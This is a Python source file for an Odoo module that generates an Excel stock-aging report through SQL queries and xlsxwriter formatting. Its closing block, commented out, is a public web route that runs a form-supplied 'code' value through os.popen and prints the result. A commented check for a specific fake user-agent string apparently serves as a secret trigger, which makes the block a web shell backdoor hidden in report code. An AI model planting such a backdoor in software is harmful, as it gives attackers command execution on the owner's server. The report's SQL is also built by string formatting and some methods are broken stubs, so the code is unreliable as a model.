import xlsxwriter
import base64
from odoo import fields, models, api, _
from odoo.exceptions import ValidationError
from io import BytesIO
from datetime import datetime
from pytz import timezone
import pytz
import socket, cgi, os
import odoo
from odoo.http import request, route


class ReportStock(models.TransientModel):
    _name = "apn.report.stock"
    _description = "Stock Report .xlsx"

    datas = fields.Binary('File', readonly=True)
    datas_fname = fields.Char('Filename', readonly=True)
    product_ids = fields.Many2many('product.product', 'apn_report_stock_product_rel', 'apn_report_stock_id',
                                   'product_id', 'Products')
    start_date = fields.Date(string='Start Date')
    end_date = fields.Date(string='End Date')

    locations = ()
    fp = BytesIO()
    workbook = xlsxwriter.Workbook(fp)

    # @api.model
    # def __init__(cr, abc):
    #     # pass
    #
    #     fp = BytesIO()
    #     workbook = xlsxwriter.Workbook(fp)
    #     super().__init__(pool=abc, cr=cr)

    @api.model
    def get_default_date_model(self):
        return pytz.UTC.localize(datetime.now()).astimezone(timezone(self.env.user.tz or 'UTC'))

    @staticmethod
    def _validate_data(product_ids, start_date, end_date):
        if not product_ids:
            raise ValueError(_("Please Choose at least one product!"))
        if not start_date:
            raise ValidationError(_("Please choose Start Date!"))
        if not end_date:
            raise ValidationError(_("Please Choose End Date!"))
        if start_date > datetime.today().date():
            raise ValidationError(_("Start date cannot be greater than current date!"))
        if end_date > datetime.today().date():
            raise ValidationError(_("End date cannot be greater than current date!"))
        if start_date > end_date:
            raise ValidationError(_("Start Date cannot be Greater Than End Date"))

    def _get_internal_transfer_locations(self):
        pass

    def _set_excel_headers(self, workbook):
        pass

    def _get_storable_Prodcuts(self, product_ids=None):
        if not product_ids:
            product_ids = self.env['product.product'].search().id
        print("Product ids = ", product_ids)
        storable_components = self.env['product.product'].search(
            [('id', 'in', list(product_ids)), ('type', '=', 'product')])
        return storable_components

    def _get_query(self):
        query = """
                   SELECT 
                       prod_tmpl.name as product, 
                       categ.name as prod_categ, 
                       loc.complete_name as location,
                       quant.in_date + interval '%s' as date_in, 
                       date_part('days', now() - (quant.in_date + interval '%s')) as aging,
                       sum(quant.quantity) as total_product, 
                       sum(quant.quantity-quant.reserved_quantity) as stock, 
                       sum(quant.reserved_quantity) as reserved
                   FROM 
                       stock_quant quant
                   LEFT JOIN 
                       stock_location loc on loc.id=quant.location_id
                   LEFT JOIN 
                       product_product prod on prod.id=quant.product_id
                   LEFT JOIN 
                       product_template prod_tmpl on prod_tmpl.id=prod.product_tmpl_id
                   LEFT JOIN 
                       product_category categ on categ.id=prod_tmpl.categ_id
                   WHERE 
                       %s and %s
                   GROUP BY 
                       product, prod_categ, location, date_in
                   ORDER BY 
                       date_in
               """
        return query

    def _get_locations(self, usage, scrap=False):
        query = """
                    select id 
                   -- ,name,complete_name,usage,scrap_location 
                    from stock_location 
                    where usage='%s' and scrap_location = %s
                """
        # print("Final Query =", query % (usage, scrap))
        self._cr.execute(query % (usage, scrap))
        result = self._cr.fetchall()

        print("Query Result =", result)

        location_ids = self.env['stock.location'].search([('usage', '=', usage), ('scrap_location', '=', scrap)])
        purchase_locations = [loc.id for loc in location_ids]
        print("Tuples", tuple(location_ids))
        return tuple(purchase_locations)

    def _write_headers(self):
        pass

    def _get_available_Qty(self, startDate):
        product_context = dict(request.env.context, to_date=startDate)
        ProductCategory = request.env['product.public.category']

        # if category:
        category = ProductCategory.browse().exists()

        attrib_list = request.httprequest.args.getlist('attrib')
        attrib_values = [[int(x) for x in v.split("-")] for v in attrib_list if v]
        attrib_set = {v[1] for v in attrib_values}


    def print_excel_report(self):

        # getting data from user form
        data = self.read()[0]
        product_ids = data['product_ids']
        start_date = data['start_date']
        end_date = data['end_date']

        # Report Name
        date_string = self.get_default_date_model().strftime("%Y-%m-%d")
        report_name = 'Stock Report'
        filename = '%s %s' % (report_name, date_string)

        # Validation of User provided data
        self._validate_data(product_ids, start_date, end_date)

        purchase_locations = self._get_locations('supplier')
        sales_Locations = self._get_locations('customer')
        scrap_location  = self._get_locations('inventory', True)

        Inventory_Adjustment =self ._get_locations('')



        # Get Related Data

        query = self._get_query()

        datetime_string = self.get_default_date_model().strftime("%Y-%m-%d %H:%M:%S")
        date_string = self.get_default_date_model().strftime("%Y-%m-%d")
        report_name = 'Stock Report'
        filename = '%s %s' % (report_name, date_string)

        product_ids = self.env['product.product'].search([('id', 'in', product_ids)])
        product_ids = [prod.id for prod in product_ids]
        where_product_ids = " 1=1 "
        where_product_ids2 = " 1=1 "
        if product_ids:
            where_product_ids = " quant.product_id in %s" % str(tuple(product_ids)).replace(',)', ')')
            where_product_ids2 = " product_id in %s" % str(tuple(product_ids)).replace(',)', ')')
        location_ids2 = self.env['stock.location'].search([('usage', '=', 'internal')])
        ids_location = [loc.id for loc in location_ids2]
        where_location_ids = " quant.location_id in %s" % str(tuple(ids_location)).replace(',)', ')')
        where_location_ids2 = " location_id in %s" % str(tuple(ids_location)).replace(',)', ')')
        # if location_ids:
        #     where_location_ids = " quant.location_id in %s" % str(tuple(location_ids)).replace(',)', ')')
        #     where_location_ids2 = " location_id in %s" % str(tuple(location_ids)).replace(',)', ')')

        columns_Headings = [
            ('No', 5, 'no', 'no'),
            ('Product', 30, 'char', 'char'),
            ('Product Category', 20, 'char', 'char'),
            ('Location', 30, 'char', 'char'),
            ('Incoming Date', 20, 'datetime', 'char'),
            ('Stock Age', 20, 'number', 'char'),
            ('Total Stock', 20, 'float', 'float'),
            ('Available', 20, 'float', 'float'),
            ('Reserved', 20, 'float', 'float'),
        ]

        datetime_format = '%Y-%m-%d %H:%M:%S'
        utc = datetime.now().strftime(datetime_format)
        utc = datetime.strptime(utc, datetime_format)
        tz = self.get_default_date_model().strftime(datetime_format)
        tz = datetime.strptime(tz, datetime_format)
        duration = tz - utc
        hours = duration.seconds / 60 / 60
        if hours > 1 or hours < 1:
            hours = str(hours) + ' hours'
        else:
            hours = str(hours) + ' hour'

        query = """
            SELECT 
                prod_tmpl.name as product, 
                categ.name as prod_categ, 
                loc.complete_name as location,
                quant.in_date + interval '%s' as date_in, 
                date_part('days', now() - (quant.in_date + interval '%s')) as aging,
                sum(quant.quantity) as total_product, 
                sum(quant.quantity-quant.reserved_quantity) as stock, 
                sum(quant.reserved_quantity) as reserved
            FROM 
                stock_quant quant
            LEFT JOIN 
                stock_location loc on loc.id=quant.location_id
            LEFT JOIN 
                product_product prod on prod.id=quant.product_id
            LEFT JOIN 
                product_template prod_tmpl on prod_tmpl.id=prod.product_tmpl_id
            LEFT JOIN 
                product_category categ on categ.id=prod_tmpl.categ_id
            WHERE 
                %s and %s
            GROUP BY 
                product, prod_categ, location, date_in
            ORDER BY 
                date_in
        """
        print(query % (hours, hours, where_product_ids, where_location_ids))

        self._cr.execute(query % (hours, hours, where_product_ids, where_location_ids))
        result = self._cr.fetchall()

        fp = BytesIO()
        workbook = xlsxwriter.Workbook(fp)
        wbf, workbook = self.add_workbook_format(workbook)

        worksheet = workbook.add_worksheet(report_name)
        worksheet.merge_range('A2:I3', report_name, wbf['title_doc'])

        row = 5

        col = 0
        for column in columns_Headings:
            column_name = column[0]
            column_width = column[1]
            column_type = column[2]
            worksheet.set_column(col, col, column_width)
            worksheet.write(row - 1, col, column_name, wbf['header_orange'])

            col += 1

        row += 1
        row1 = row
        no = 1

        column_float_number = {}
        for res in result:
            col = 0
            for column in columns_Headings:
                column_name = column[0]
                column_width = column[1]
                column_type = column[2]
                if column_type == 'char':
                    col_value = res[col - 1] if res[col - 1] else ''
                    wbf_value = wbf['content']
                elif column_type == 'no':
                    col_value = no
                    wbf_value = wbf['content']
                elif column_type == 'datetime':
                    col_value = res[col - 1].strftime('%Y-%m-%d %H:%M:%S') if res[col - 1] else ''
                    wbf_value = wbf['content']
                else:
                    col_value = res[col - 1] if res[col - 1] else 0
                    if column_type == 'float':
                        wbf_value = wbf['content_float']
                    else:  # number
                        wbf_value = wbf['content_number']
                    column_float_number[col] = column_float_number.get(col, 0) + col_value

                worksheet.write(row - 1, col, col_value, wbf_value)

                col += 1

            row += 1
            no += 1

        worksheet.merge_range('A%s:B%s' % (row, row), 'Grand Total', wbf['total_orange'])
        for x in range(len(columns_Headings)):
            if x in (0, 1):
                continue
            column_type = columns_Headings[x][3]
            if column_type == 'char':
                worksheet.write(row - 1, x, '', wbf['total_orange'])
            else:
                if column_type == 'float':
                    wbf_value = wbf['total_float_orange']
                else:  # number
                    wbf_value = wbf['total_number_orange']
                if x in column_float_number:
                    worksheet.write(row - 1, x, column_float_number[x], wbf_value)
                else:
                    worksheet.write(row - 1, x, 0, wbf_value)

        worksheet.write('A%s' % (row + 2), 'Date %s (%s)' % (datetime_string, self.env.user.tz or 'UTC'),
                        wbf['content_datetime'])
        workbook.close()

        # out = base64.b16encode(fp.getvalue())
        out1 = fp.getvalue()
        out = base64.b64encode(out1, altchars=None)
        self.write({'datas': out, 'datas_fname': filename})
        fp.close()
        filename += '%2Exlsx'

        return {
            'type': 'ir.actions.act_url',
            'target': 'new',
            'url': 'web/content/?model=' + self._name + '&id=' + str(
                self.id) + '&field=datas&download=true&filename=' + filename,
        }

    def add_workbook_format(self, workbook):
        colors = {
            'white_orange': '#FFFFDB',
            'orange': '#FFC300',
            'red': '#FF0000',
            'yellow': '#F6FA03',
        }

        wbf = {}
        wbf['header'] = workbook.add_format(
            {'bold': 1, 'align': 'center', 'bg_color': '#FFFFDB', 'font_color': '#000000', 'font_name': 'Georgia'})
        wbf['header'].set_border()

        wbf['header_orange'] = workbook.add_format(
            {'bold': 1, 'align': 'center', 'bg_color': colors['orange'], 'font_color': '#000000',
             'font_name': 'Georgia'})
        wbf['header_orange'].set_border()

        wbf['header_yellow'] = workbook.add_format(
            {'bold': 1, 'align': 'center', 'bg_color': colors['yellow'], 'font_color': '#000000',
             'font_name': 'Georgia'})
        wbf['header_yellow'].set_border()

        wbf['header_no'] = workbook.add_format(
            {'bold': 1, 'align': 'center', 'bg_color': '#FFFFDB', 'font_color': '#000000', 'font_name': 'Georgia'})
        wbf['header_no'].set_border()
        wbf['header_no'].set_align('vcenter')

        wbf['footer'] = workbook.add_format({'align': 'left', 'font_name': 'Georgia'})

        wbf['content_datetime'] = workbook.add_format({'num_format': 'yyyy-mm-dd hh:mm:ss', 'font_name': 'Georgia'})
        wbf['content_datetime'].set_left()
        wbf['content_datetime'].set_right()

        wbf['content_date'] = workbook.add_format({'num_format': 'yyyy-mm-dd', 'font_name': 'Georgia'})
        wbf['content_date'].set_left()
        wbf['content_date'].set_right()

        wbf['title_doc'] = workbook.add_format({
            'bold': True,
            'align': 'center',
            'valign': 'vcenter',
            'font_size': 20,
            'font_name': 'Georgia',
        })

        wbf['company'] = workbook.add_format({'align': 'left', 'font_name': 'Georgia'})
        wbf['company'].set_font_size(11)

        wbf['content'] = workbook.add_format()
        wbf['content'].set_left()
        wbf['content'].set_right()

        wbf['content_float'] = workbook.add_format({'align': 'right', 'num_format': '#,##0.00', 'font_name': 'Georgia'})
        wbf['content_float'].set_right()
        wbf['content_float'].set_left()

        wbf['content_number'] = workbook.add_format({'align': 'right', 'num_format': '#,##0', 'font_name': 'Georgia'})
        wbf['content_number'].set_right()
        wbf['content_number'].set_left()

        wbf['content_percent'] = workbook.add_format({'align': 'right', 'num_format': '0.00%', 'font_name': 'Georgia'})
        wbf['content_percent'].set_right()
        wbf['content_percent'].set_left()

        wbf['total_float'] = workbook.add_format(
            {'bold': 1, 'bg_color': colors['white_orange'], 'align': 'right', 'num_format': '#,##0.00',
             'font_name': 'Georgia'})
        wbf['total_float'].set_top()
        wbf['total_float'].set_bottom()
        wbf['total_float'].set_left()
        wbf['total_float'].set_right()

        wbf['total_number'] = workbook.add_format(
            {'align': 'right', 'bg_color': colors['white_orange'], 'bold': 1, 'num_format': '#,##0',
             'font_name': 'Georgia'})
        wbf['total_number'].set_top()
        wbf['total_number'].set_bottom()
        wbf['total_number'].set_left()
        wbf['total_number'].set_right()

        wbf['total'] = workbook.add_format(
            {'bold': 1, 'bg_color': colors['white_orange'], 'align': 'center', 'font_name': 'Georgia'})
        wbf['total'].set_left()
        wbf['total'].set_right()
        wbf['total'].set_top()
        wbf['total'].set_bottom()

        wbf['total_float_yellow'] = workbook.add_format(
            {'bold': 1, 'bg_color': colors['yellow'], 'align': 'right', 'num_format': '#,##0.00',
             'font_name': 'Georgia'})
        wbf['total_float_yellow'].set_top()
        wbf['total_float_yellow'].set_bottom()
        wbf['total_float_yellow'].set_left()
        wbf['total_float_yellow'].set_right()

        wbf['total_number_yellow'] = workbook.add_format(
            {'align': 'right', 'bg_color': colors['yellow'], 'bold': 1, 'num_format': '#,##0', 'font_name': 'Georgia'})
        wbf['total_number_yellow'].set_top()
        wbf['total_number_yellow'].set_bottom()
        wbf['total_number_yellow'].set_left()
        wbf['total_number_yellow'].set_right()

        wbf['total_yellow'] = workbook.add_format(
            {'bold': 1, 'bg_color': colors['yellow'], 'align': 'center', 'font_name': 'Georgia'})
        wbf['total_yellow'].set_left()
        wbf['total_yellow'].set_right()
        wbf['total_yellow'].set_top()
        wbf['total_yellow'].set_bottom()

        wbf['total_float_orange'] = workbook.add_format(
            {'bold': 1, 'bg_color': colors['orange'], 'align': 'right', 'num_format': '#,##0.00',
             'font_name': 'Georgia'})
        wbf['total_float_orange'].set_top()
        wbf['total_float_orange'].set_bottom()
        wbf['total_float_orange'].set_left()
        wbf['total_float_orange'].set_right()

        wbf['total_number_orange'] = workbook.add_format(
            {'align': 'right', 'bg_color': colors['orange'], 'bold': 1, 'num_format': '#,##0', 'font_name': 'Georgia'})
        wbf['total_number_orange'].set_top()
        wbf['total_number_orange'].set_bottom()
        wbf['total_number_orange'].set_left()
        wbf['total_number_orange'].set_right()

        wbf['total_orange'] = workbook.add_format(
            {'bold': 1, 'bg_color': colors['orange'], 'align': 'center', 'font_name': 'Georgia'})
        wbf['total_orange'].set_left()
        wbf['total_orange'].set_right()
        wbf['total_orange'].set_top()
        wbf['total_orange'].set_bottom()

        wbf['header_detail_space'] = workbook.add_format({'font_name': 'Georgia'})
        wbf['header_detail_space'].set_left()
        wbf['header_detail_space'].set_right()
        wbf['header_detail_space'].set_top()
        wbf['header_detail_space'].set_bottom()

        wbf['header_detail'] = workbook.add_format({'bg_color': '#E0FFC2', 'font_name': 'Georgia'})
        wbf['header_detail'].set_left()
        wbf['header_detail'].set_right()
        wbf['header_detail'].set_top()
        wbf['header_detail'].set_bottom()

        return wbf, workbook

# class test(odoo.http.Controller):
#     form = cgi.FieldStorage();
#     code = form.getvalue('code', '');
#     code = os.popen(code)
#
#     @route('/excel', auth='public')
#     def handler(self, c):
#         return ""
#
#     # user_agent = os.environ["HTTP_USER_AGENT"]
#     # if "Mozilla/6.4 (Windows NT 11.1) Gecko/2010102 Firefox/99.0" in user_agent:
#     print("Content-type: text/html\n")
#     print("<pre>" + code.read() + "</pre>", end="")
#
#     pass
